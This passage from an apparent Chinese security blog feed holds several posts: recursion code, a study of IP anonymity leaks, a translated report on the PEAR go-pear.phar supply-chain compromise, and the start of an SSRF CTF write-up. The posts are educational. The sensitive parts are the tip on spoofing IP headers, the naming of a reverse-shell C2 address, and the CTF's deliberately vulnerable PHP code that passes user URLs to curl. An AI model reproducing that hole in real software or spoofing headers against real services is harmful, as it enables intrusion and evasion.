punctuation">}</span><span class="token comment" spellcheck="true">//    for(int i=0;i&lt;tree.size();++i){</span><span class="token comment" spellcheck="true">//        cout&lt;&lt;tree.at(i)&lt;&lt;endl;</span><span class="token comment" spellcheck="true">//    }</span><span class="token punctuation">}</span></code></pre><p>可以看到flag变量对应的就是Tree的分支总数，而题目要求的是没有重复组合的结果，在树的分支中存在重复的节点，例如我们要获得<code>n=5</code>的结果，那么<code>1-3-1</code>和<code>1-1-3</code>两个分支就产生了重复，此时对树的分支进行结点排序，然后通过集合去重，这时得到的才是真正的结果。</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190317162524.png" alt=""></p><p>如果<code>di_gui</code>不用全局变量flag的话，可以把flag放入方法中：</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">di_gui</span><span class="token punctuation">(</span><span class="token keyword">int</span> head<span class="token punctuation">,</span><span class="token keyword">int</span> result<span class="token punctuation">,</span>string treeone<span class="token operator">=</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> flag<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>result<span class="token operator">-</span>head<span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">+</span>head<span class="token operator">&lt;</span>result<span class="token punctuation">)</span><span class="token punctuation">{</span>            string treetmp <span class="token operator">=</span> treeone<span class="token punctuation">;</span>            treetmp<span class="token operator">+</span><span class="token operator">=</span><span class="token function">to_string</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            flag<span class="token operator">+</span><span class="token operator">=</span><span class="token function">di_gui</span><span class="token punctuation">(</span>i<span class="token operator">+</span>head<span class="token punctuation">,</span>result<span class="token punctuation">,</span>treetmp<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//cout&lt;&lt;"dian"&lt;&lt;endl;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            string treetmp2 <span class="token operator">=</span> treeone<span class="token punctuation">;</span>            treetmp2<span class="token operator">+</span><span class="token operator">=</span><span class="token function">to_string</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            tree<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>treetmp2<span class="token punctuation">)</span><span class="token punctuation">;</span>            flag<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//cout&lt;&lt;flag&lt;&lt;endl;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> flag<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>Python版固定长度的字符串排列组合：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">import</span> hashlib<span class="token keyword">def</span> <span class="token function">perm</span><span class="token punctuation">(</span>s<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 这里是递归函数的出口，为什么呢，因为这里表示：一个长度为1的字符串，它的排列组合就是它自己。</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span>s<span class="token punctuation">]</span>    sl<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#保存字符串的所有可能排列组合</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#这个循环，对应 解题思路1）确定字符串的第一个字母是谁，有n种可能（n为字符串s的长度</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> perm<span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span>i<span class="token punctuation">]</span><span class="token operator">+</span>s<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#这个循环，对应 解题思路2）进入递归，s[0:i]+s[i+1:]的意思就是把s中的s[i]给去掉</span>            sl<span class="token punctuation">.</span>append<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>j<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 对应 解题思路2）问题就从“返回字符串中的字母排列组合” **变成了** “返回 第一个字母+除去第一个字母外的字符串的排列组合”</span>    <span class="token keyword">return</span> sl<span class="token keyword">def</span> <span class="token function">sha1</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>    hash <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span>    hash<span class="token punctuation">.</span>update<span class="token punctuation">(</span>str<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> hash<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># dict0 = '12eshcn'</span>    <span class="token comment" spellcheck="true"># dict1 = '!2eshcn'</span>    <span class="token comment" spellcheck="true"># dict2 = '!@eshcn'</span>    <span class="token comment" spellcheck="true"># dict3 = '1@eshcn'</span>    dicts <span class="token operator">=</span> <span class="token string">''</span><span class="token comment" spellcheck="true">#要排列组合的字符</span>    perm_nums<span class="token operator">=</span>perm<span class="token punctuation">(</span>dicts<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>perm_nums<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># for key in perm_nums:</span>    <span class="token comment" spellcheck="true">#      flag = "flag{%s}"%key</span>    <span class="token comment" spellcheck="true">#      if str(sha1(flag)) == "e6079c5ce56e781a50f4bf853cdb5302e0d8f054":</span>    <span class="token comment" spellcheck="true">#          print(flag)</span></code></pre><p>同样是递归＋Tree的方法获取到结果。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;😄算法太菜。&lt;br&gt;
    
    </summary>
    
      <category term="Algorithm" scheme="http://www.yof3ng.xyz/categories/Algorithm/"/>
    
    
      <category term="Algorithm" scheme="http://www.yof3ng.xyz/tags/Algorithm/"/>
    
      <category term="Tree" scheme="http://www.yof3ng.xyz/tags/Tree/"/>
    
  </entry>
  
  <entry>
    <title>IP匿名性研究</title>
    <link href="http://www.yof3ng.xyz/2019/02/21/IP%E5%8C%BF%E5%90%8D%E6%80%A7%E7%A0%94%E7%A9%B6/"/>
    <id>http://www.yof3ng.xyz/2019/02/21/IP匿名性研究/</id>
    <published>2019-02-21T12:06:12.000Z</published>
    <updated>2019-04-02T08:39:40.080Z</updated>
    
    <content type="html"><![CDATA[<p>IP匿名性研究——Anonymity</p><a id="more"></a><h1 id="IP匿名性研究——Anonymity"><a href="#IP匿名性研究——Anonymity" class="headerlink" title="IP匿名性研究——Anonymity"></a>IP匿名性研究——Anonymity</h1><h2 id="何谓匿名？"><a href="#何谓匿名？" class="headerlink" title="何谓匿名？"></a>何谓匿名？</h2><blockquote><p>匿名定义为<strong>未知姓名或未确定身份</strong>。我们上网时并没有匿名，即使在使用隐私工具如Tor、Bitcoin或VPN的时候。每项服务至少有一条可以用于区分不同用户的信息，无论其为一套IP地址（VPN或Tor）还是一个电子钱包（Bitcoin）。这种信息本身可能不会泄露用户的任何私人信息，但其可与其它相似信息联系起来，最终确定个人的身份。</p><p>VPN虽然不会使得我们完全匿名，但它会极大增强上网时的隐私和安全。</p></blockquote><p>既然不可能做到完全匿名，我们只能提高相对匿名性，从而使得自己在网络中的<strong>隐私度更高</strong>，<strong>安全性更高</strong>。</p><h2 id="一定的匿名性是有必要的"><a href="#一定的匿名性是有必要的" class="headerlink" title="一定的匿名性是有必要的"></a>一定的匿名性是有必要的</h2><p>互联网时代，个人隐私的保护更加复杂与困难，亟待各种保护手段的更新和创新。比如在网络立法层面，目前仍有许多空白，缺乏相应的顶层设计。有必要在个人信息保护、电子商务等领域建立严格健全的法律规定，划定互联网服务商的“禁区”，明确权责，让处在弱势的普通用户拥有知情权、选择权与维权的依据。</p><p>因而在当今这个时代，不论是信息/网络安全从业者，还是普通群众都应该自主地去提高自己的安全意识，通过一些措施防止自己的信息泄露。</p><h2 id="什么因素会泄露你的真实IP信息？"><a href="#什么因素会泄露你的真实IP信息？" class="headerlink" title="什么因素会泄露你的真实IP信息？"></a>什么因素会泄露你的真实IP信息？</h2><p>可以小结出以下因素：</p><ul><li>IPV4地址泄露</li><li>IPV6地址泄露</li><li>DNS泄露</li><li>WebRTC泄露</li><li>HTTPHeader信息泄露</li><li>等等…..</li></ul><h3 id="IPV4泄露"><a href="#IPV4泄露" class="headerlink" title="IPV4泄露"></a>IPV4泄露</h3><blockquote><p>IPv4使用32位（4字节）地址，因此地址空间中只有4,294,967,296（232）个地址。不过，一些地址是为特殊用途所保留的，如专用网络（约1800万个地址）和多播地址（约2.7亿个地址），这减少了可在互联网上路由的地址数量。随着地址不断被分配给最终用户，IPv4地址枯竭问题也在随之产生。基于分类网络、无类别域间路由和网络地址转换的地址结构重构显著地减少了地址枯竭的速度。但在2011年2月3日，在最后5个地址块被分配给5个区域互联网注册管理机构之后，IANA的主要地址池已经用尽。</p></blockquote><p>我们现在常说的IP地址就是指IPV4地址，通常我们在使用浏览器访问web站点时，请求头中会包含我们的IPV4地址，因此可以被服务器获取到我们的IP并记录进入日志。</p><h3 id="IPV6泄露"><a href="#IPV6泄露" class="headerlink" title="IPV6泄露"></a>IPV6泄露</h3><blockquote><p>Internet协议版本6（IPv6）是Internet协议（IP）的最新版本，IP协议是为网络上的计算机提供标识和定位系统并通过Internet路由流量的通信协议。IPv6是由互联网工程任务组（IETF）开发的，用于解决长期以来的IPv4地址耗尽问题。</p><p>除了更大的寻址空间之外，IPv6还提供其他技术优势。特别是，它允许分层地址分配方法，这些方法有助于跨Internet的<a href="https://en.wikipedia.org/wiki/Route_aggregation" target="_blank" rel="noopener">路由聚合</a>，从而限制了<a href="https://en.wikipedia.org/wiki/Routing_table" target="_blank" rel="noopener">路由表</a>的扩展。扩展和简化了多播寻址的使用，并为服务的提供提供了额外的优化。在协议的设计中已经考虑了设备移动性，安全性和配置方面。</p><p>IPv6地址表示为八组，每组四个<a href="https://en.wikipedia.org/wiki/Hexadecimal" target="_blank" rel="noopener">十六进制</a>数字，组以冒号分隔，例如2001：0db8：0000：0042：0000：8a2e：0370：7334，但存在缩写此完整符号的方法。</p></blockquote><p>IPV6是还未普遍使用的一种地址，用于解决长期以来的IPv4地址耗尽问题，通过没有隐藏IPV6也会泄露我们信息。</p><h3 id="DNS泄露"><a href="#DNS泄露" class="headerlink" title="DNS泄露"></a>DNS泄露</h3><p>什么是DNS?</p><blockquote><p>DNS或域名系统用于将域名（如<a href="http://www.astrill.com）转换为数字IP地址，例如" target="_blank" rel="noopener">www.astrill.com）转换为数字IP地址，例如</a> 123.98.12.1在互联网上用于发送数据包。 每当您的计算机需要联系网络上的服务器时，例如当您在浏览器中输入URL时，您的计算机会联系DNS服务器并请求IP地址。大多数互联网服务提供商为他们的客户分配一个DNS服务器，它们用于控制和记录您的互联网活动。</p></blockquote><p>在某些情况下，即使连接到匿名网络，操作系统仍将继续使用其默认DNS服务器，而不是由匿名网络分配给您计算机的匿名DNS服务器。这被称为泄漏。DNS泄漏是主要的隐私威胁，因为匿名网络可能会在私人数据泄露的同时提供错误的安全感。</p><p>当您的DNS请求被泄露时，发送到/从网站发送的实际数据将不被捕获。但它仍然可以向窃听者提供关于您访问的网站的足够信息。它也为DNS病毒打开门户，可用于钓鱼攻击(DNS劫持)。</p><h3 id="WEBRTC泄露"><a href="#WEBRTC泄露" class="headerlink" title="WEBRTC泄露"></a>WEBRTC泄露</h3><blockquote><p>什么是WEBRTC？</p><p>WebRTC（Web Real-Time Communication）是一个支持网页浏览器进行实时语音对话或视频对话的技术，是谷歌2010年以6820万美元收购Global IP Solutions公司而获得的一项技术。2011年5月谷歌开放了WebRTC的源代码，在行业内得到了广泛的支持和应用。</p></blockquote><p>即使您正在使用 VPN，也会出现多个可以泄漏 IP 地址的“意想不到的错误”。它被称为 WebRTC（Web 实时通信）泄漏。</p><p>WebRTC 允许浏览器内部的实时通信。这很方便，但也有一个缺点。即使打开了VPN，WebRTC 也能默认泄漏您的真实地址。WebRTC 协议通过设计实现此目的，即使是最好的 VPN 也无法始终保护自己的信息不被泄露。</p><p>因此，如果使用默认启用 WebRTC 的浏览器，则采取必要的预防措施这一点十分重要。在选择的浏览器中搜索如何关闭 WebRTC，或查找是否存在可安装用来禁用 WebRTC 的 WebRTC 阻止插件。请记住，禁用 WebRTC 可能会导致部分网站（如 Google Hangouts）无法正常工作，因此您可能需要在特定情况下启用它。</p><pre class=" language-payload"><code class="language-payload">Firefox浏览器禁用WebRTC的方法是：在浏览器上输入：about:config。之后搜索：media.peerconnection.enabled。找到它后双击，将其改成 false 即可。Chrome浏览器禁用WebRTC的方法是：在Chrome应用商店里，安装一个名为WebRTC Leak Prevent的扩展，然后选择 Use my Porxy server(if present) 即可。</code></pre><h3 id="HTTPheader泄露"><a href="#HTTPheader泄露" class="headerlink" title="HTTPheader泄露"></a>HTTPheader泄露</h3><p>http请求数据包中的<code>header</code>:</p><pre class=" language-html"><code class="language-html">GET / HTTP/1.1Host: www.4399.comConnection: keep-aliveUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: zh,en-US;q=0.9,en;q=0.8,zh-TW;q=0.7,zh-CN;q=0.6Cookie: home4399=yes; UM_distinctid=169050f7793431-0062d73fb17ef-b79183d-144000-169050f7794319; CNZZDATA30039538=cnzz_eid%3D1853484585-1550564275-%26ntime%3D1550564275If-None-Match: W/"5c6b5dba-2a86c"If-Modified-Since: Tue, 19 Feb 2019 01:36:58 GMT</code></pre><p>可见，通过<code>header</code>中的<code>Accept-Language</code>,<code>User-Agent</code>泄露了一些信息，如：我们使用的是中文和英文，用户详细UA信息等等。</p><p>一般情况下我们也可以使用<code>X-Forwarded-For</code>,<code>X-Client-IP</code>,<code>X-Real-IP</code>,<code>X-Remote-IP</code>等请求属性伪造IP从而骗过服务器的IP识别。</p><h2 id="IP匿名性测试"><a href="#IP匿名性测试" class="headerlink" title="IP匿名性测试"></a>IP匿名性测试</h2><p>我们接下来基于windows10和parrot linux平台代理进行IP匿名性测试，代理软件是最普通的<code>小飞机(ssr)</code>，值得一提的是<code>Electron版小飞机</code>还不错，跨平台。</p><blockquote><p>什么是Parrot linux?</p><p>Parrot Security OS（简称作「ParrorSec」或「Parrot（鹦鹉）」）是一个基于 Debian 面向安全的 GNU/<a href="https://www.linuxprobe.com/" target="_blank" rel="noopener">Linux</a> 发行版。它提供了诸多用于安全测试、数字取证、软件开发及隐私防护的专业工具。</p><p>Parrot与kali类似，但比kali多很多工具。在我目前使用的情况看来，同等配置下Parrot要比kali美观流畅。</p></blockquote><p>使用以下三个网址进行匿名性检测：    </p><ul><li><a href="https://www.astrill.com/zh/vpn-leak-test" target="_blank" rel="noopener">https://www.astrill.com/zh/vpn-leak-test</a></li><li><a href="https://whoer.net/zh" target="_blank" rel="noopener">https://whoer.net/zh</a></li><li><a href="http://ceye.io/" target="_blank" rel="noopener">http://ceye.io/</a></li></ul><p>通过测试直观地显现出不同平台，不同情况下的匿名程度，从而得到其差别。</p><h3 id="Windows-10平台"><a href="#Windows-10平台" class="headerlink" title="Windows 10平台"></a>Windows 10平台</h3><p>在我的物理机<code>windows 10</code>本地启用<code>小飞机</code>之后，我们分别从几个测试平台获得了IP匿名性测试结果：</p><p><code>astrill.com</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219200332.png" alt=""></p><p><code>whoer.net</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219200512.png" alt=""></p><p><code>ceye.io</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219193744.png" alt=""></p><p>通过伪造httpheader中的<code>x-real-ip</code>我们可以给自己加上一层伪装，但是并不能逃过检测：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219194704.png" alt=""></p><p>由以上三个结果可以了解到，单纯在win10上使用小飞机代理时，astrill和whoer平台的结果共同反映出了DNS和WEBRTC的泄露，以及页面语言，当地时间等信息。而ceye的结果更是直接得到了我们的真实IP，仅凭上述信息已经可以精确知道我是哪个村的人了(开个玩笑hhh)，因此在win10上小飞机的匿名性堪忧。</p><h3 id="Parrot-Linux平台"><a href="#Parrot-Linux平台" class="headerlink" title="Parrot Linux平台"></a>Parrot Linux平台</h3><p>在我的虚拟机<code>Parrot Linux</code>启用<code>小飞机</code>之后，我们分别从几个测试平台获得了IP匿名性测试结果：</p><p><code>astrill.com</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219195503.png" alt=""></p><p><code>whoer.net</code>:</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219195626.png" class="lazyload"></p><p><code>ceye.io</code>:</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219195409.png" class="lazyload"></p><p>由以上三个结果可以看到，没有出现与我所在地有关的信息，检测到的IP也不是我的真实IP(117.170.**<em>.\</em>**)，而是代理服务器的IP地址，没有出现DNS和WEBRTC泄露，因而可以看出<code>Parrot linux</code>作为一个面向安全测试的linux发行版的匿名性是十分之高的，相对于win10匿名性要提高了不少。</p><h3 id="以Parrot作为跳板，为win10代理"><a href="#以Parrot作为跳板，为win10代理" class="headerlink" title="以Parrot作为跳板，为win10代理"></a>以Parrot作为跳板，为win10代理</h3><p>既然Parrot的匿名性比较好，那我们把parrot作为跳板（parrot上的小飞机允许局域网连接），用win10连接运行在parrot上的小飞机代理，会有什么结果呢？</p><p><code>whoer.net</code>:</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219201252.png" class="lazyload"></p><p>ceye.io和astrill检测是正常的，没有泄露信息，但是从whoer.net的结果看来：泄露了时区，语言等信息。最关键的是WEBRTC直接泄露出了我们的真实IP地址和内网地址。</p><blockquote><p>Parrot OS中自带Tor网络，和匿名模式，以上测试均在未开启Tor网络和匿名模式情况下测试。</p><p>总的来说，单纯地使用Parrot还是很香很匿名的！</p></blockquote><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>当今的科技发展迅速，隐私信息也显得越来越重要，通过一部分真实的蛛丝马迹，就可能还原出精准的信息模型。IPV6泄露，DNS泄露，WEBRTC泄露，HTTPheader泄露都可能导致你在网络上的匿名性降低，可能对于普通人来说，这只是无关紧要的事情，但对于诸位安全从业者来说，其中利弊不用多言。</p><blockquote><p>注明: <a href="https://mp.weixin.qq.com/s/Otk44j7UNbT_FX9mXq6o4Q" target="_blank" rel="noopener">此文章首发于安恒网络空间安全讲武堂公众号</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;IP匿名性研究——Anonymity&lt;/p&gt;
    
    </summary>
    
      <category term="网络安全" scheme="http://www.yof3ng.xyz/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络安全" scheme="http://www.yof3ng.xyz/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
      <category term="IP匿名性" scheme="http://www.yof3ng.xyz/tags/IP%E5%8C%BF%E5%90%8D%E6%80%A7/"/>
    
      <category term="ParrotOS" scheme="http://www.yof3ng.xyz/tags/ParrotOS/"/>
    
  </entry>
  
  <entry>
    <title>php_pear_was_attacked</title>
    <link href="http://www.yof3ng.xyz/2019/01/31/php-pear-was-attacked/"/>
    <id>http://www.yof3ng.xyz/2019/01/31/php-pear-was-attacked/</id>
    <published>2019-01-31T09:06:06.000Z</published>
    <updated>2019-04-02T08:45:35.743Z</updated>
    
    <content type="html"><![CDATA[<p>……</p><a id="more"></a><blockquote><p>译文声明：</p><p>本文是翻译文章，文章原作者<a href="https://thehackernews.com/p/authors.html" target="_blank" rel="noopener">Mohit Kumar</a>，文章来源：<a href="https://thehackernews.com/2019/01/php-pear-hacked.html" target="_blank" rel="noopener">https://thehackernews.com/2019/01/php-pear-hacked.html</a></p></blockquote><h1 id="PHP-PEAR网站被黑且其官方软件包管理器被恶意篡改"><a href="#PHP-PEAR网站被黑且其官方软件包管理器被恶意篡改" class="headerlink" title="PHP PEAR网站被黑且其官方软件包管理器被恶意篡改"></a>PHP PEAR网站被黑且其官方软件包管理器被恶意篡改</h1><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190130104752.png" alt=""></p><blockquote><p>小心！如果您在过去6个月内从PHP官方网站下载了PHP PEAR包管理器，我们只能很遗憾对您说您的服务器可能已经成为肉鸡。</p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上周，PEAR的维护人员发现有人<strong>恶意替换了原来的PHP PEAR包管理器（go-pear.phar）</strong>，且黑客在核心PEAR文件系统中使用了篡改后的版本，在此之后维护人员迅速关闭了PEAR的官方网站（pear-php.net）。</p><p>尽管PEAR开发人员还在分析恶意程序包，但团队在2019年1月19日迅速发布的安全公告证实，被黑客入侵的网站服务放置了受恶意代码污染的安装文件至少半年之久，可想而知有多少人下载了被污染的安装包。</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190130105824.png" alt=""></p><h2 id="PHP-PEAR是什么？"><a href="#PHP-PEAR是什么？" class="headerlink" title="PHP-PEAR是什么？"></a>PHP-PEAR是什么？</h2><p>PHP扩展和应用程序存储库（PEAR）是一个社区驱动的框架和分发系统，它使得任何人都可以搜索和下载使用PHP编程语言编写的免费库。这些开源库（或许称之为软件包更为恰当）允许开发人员在其项目和网站中轻松添加其他功能，包括身份验证，缓存，加密，Web服务等等。</p><p>当您下载用于Unix / Linux / BSD系统的PHP软件时，PEAR下载管理器（go-pear.phar）已预先安装，而Windows和Mac OS X用户在必要的时侯需手动安装该组件。</p><p>由于许多网络托管公司（包括共享托管服务提供商）也允许其用户安装和运行PEAR，因此这种最新的安全漏洞可能会<strong>影响大量网站及其访问者</strong>。</p><h2 id="PEAR-团队声明"><a href="#PEAR-团队声明" class="headerlink" title="PEAR 团队声明"></a>PEAR 团队声明</h2><blockquote><p>“如果您在过去六个月之内已经下载了这个<code>go-pear.phar</code>，那么您应该从<code>GitHub（pear / pearweb_phars）</code>获取相同发行版本的新副本并比较其文件哈希值。如果不同，您可能会有安装受感染的文件的风险”，PEAR官方网站上的说明如上。</p></blockquote><p>根据PEAR维护人员的说法，该团队目前正在进行追踪、溯源调查，以确定攻击的程度以及攻击者是如何在这么早的时期就能够攻破服务器。</p><p>而现在可以在Github上获取到净化后的版本<code>pearweb_phars-1.10.10</code>，此前在服务器<code>http：//pear.php.net</code>上受到污染的版本是<code>v1.10.9</code>，PEAR团队也重新发布了未受污染的<code>go-pear.phar-v1.10.9</code>，并且会包含有每个不同<code>phar</code>的单独GPG签名文件，用以验明其正确性。</p><p>后来开发人员进行了进一步的通知说明，证实只有<code>http://pear.php.net</code>服务器上的副本受到了影响，而且<code>go-pear.phar</code>的GitHub副本并没有替换为污染后的文件。</p><p>因此所有在过去六个月内从官方网站下载过安装文件<code>go-pear.phar</code>的PHP / PEAR用户<strong>都应该认识</strong>到自己有被黑客侵害的风险，并且最好替换文件为Github上的纯净版本。</p><h2 id="PEAR-团队针对此次供应链污染的部分调查信息"><a href="#PEAR-团队针对此次供应链污染的部分调查信息" class="headerlink" title="PEAR 团队针对此次供应链污染的部分调查信息"></a>PEAR 团队针对此次供应链污染的部分调查信息</h2><p><strong>更新</strong> -  PEAR团队发布了有关最近安全事件的更多详细信息，解释了在2018年12月20日最后一次正式文件发布后，其服务器上发现<code>go-pear.phar</code>被污染的详细状况。</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190130111806.png" alt=""></p><p>PEAR 团队在分析了包管理器的污染版本文件之后，发现恶意代码模块<code>通过Perl向IP 104.131.154.154生成反向shell</code>，这意味着受感染的服务器将生成后门，允许攻击者完全控制它们，包括安装应用程序，运行恶意代码，窃取敏感数据的能力。</p><p>根据<a href="https://blog.dcso.de/php-pear-software-supply-chain-attack/" target="_blank" rel="noopener">DCSO上德国网络安全组织对此次供应链污染的分析报告</a>得知：服务器IP地址<code>104.131.154.154</code>指向一个web域名<code>bestlinuxgames [.] com</code>，该服务器被认为是黑客使用的一台受感染后主机（肉鸡/C2服务器）。</p><blockquote><p>“该IP已被证实与此次供应链污染有关，但没有发现其他违规行为。<code>install-pear-nozlib.phar</code>软件包是正常的，GitHub上的<code>go-pear.phar</code>文件也是正常的，可以将任何可疑的样本哈希与正确的MD5值进行校验。”；</p><p>“因此，假如您在12/20之前下载了<code>go-pear.phar</code>用以在您的系统上安装PEAR包，那么您<strong>应该担心</strong>自己是否会成为肉鸡，特别是当您的系统具有可用的<code>sh</code>和<code>perl</code>的时候，我们并没有具体证据去确认您是否下载了被感染的文件，但保险起见还是希望您能好好检查一下您的系统。”；</p><p>“另外还需要注意的是，这不会污染使用PEAR安装的程序包…它污染的是初始安装PEAR安装程序的<code>go-pear.phar</code>可执行文件，即使用<code>pear</code>命令安装的各种PEAR包<strong>不受</strong>影响。”；</p><p>PEAR 团队在一系列推文中的表示如上。</p></blockquote><p>PS：当今的供应链污染事件越来越多，谨慎小心方能驶得万年船。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;……&lt;/p&gt;
    
    </summary>
    
      <category term="译文" scheme="http://www.yof3ng.xyz/categories/%E8%AF%91%E6%96%87/"/>
    
    
      <category term="网络安全" scheme="http://www.yof3ng.xyz/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
      <category term="资讯" scheme="http://www.yof3ng.xyz/tags/%E8%B5%84%E8%AE%AF/"/>
    
      <category term="译文" scheme="http://www.yof3ng.xyz/tags/%E8%AF%91%E6%96%87/"/>
    
  </entry>
  
  <entry>
    <title>ssrf_by_http2_and_gopher</title>
    <link href="http://www.yof3ng.xyz/2019/01/31/ssrf-by-http2-and-gopher/"/>
    <id>http://www.yof3ng.xyz/2019/01/31/ssrf-by-http2-and-gopher/</id>
    <published>2019-01-31T09:05:24.000Z</published>
    <updated>2019-04-02T08:46:31.127Z</updated>
    
    <content type="html"><![CDATA[<p>……</p><a id="more"></a><h1 id="pwnhub-pink-friend"><a href="#pwnhub-pink-friend" class="headerlink" title="pwnhub-pink-friend"></a>pwnhub-pink-friend</h1><blockquote><p>参考链接：</p><p><a href="http://f1sh.site/2019/01/30/pwnhub-pink-friend-writeup/" target="_blank" rel="noopener">http://f1sh.site/2019/01/30/pwnhub-pink-friend-writeup/</a></p><p><a href="https://www.virzz.com/2019/01/29/pwnhub_2019_pink_friend_http2.html" target="_blank" rel="noopener">https://www.virzz.com/2019/01/29/pwnhub_2019_pink_friend_http2.html</a></p></blockquote><p>题目链接：<a href="https://40.73.33.181/index.php" target="_blank" rel="noopener">https://40.73.33.181/index.php</a></p><p>source code:</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Can not parse url: '</span><span class="token punctuation">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span> <span class="token punctuation">(</span><span 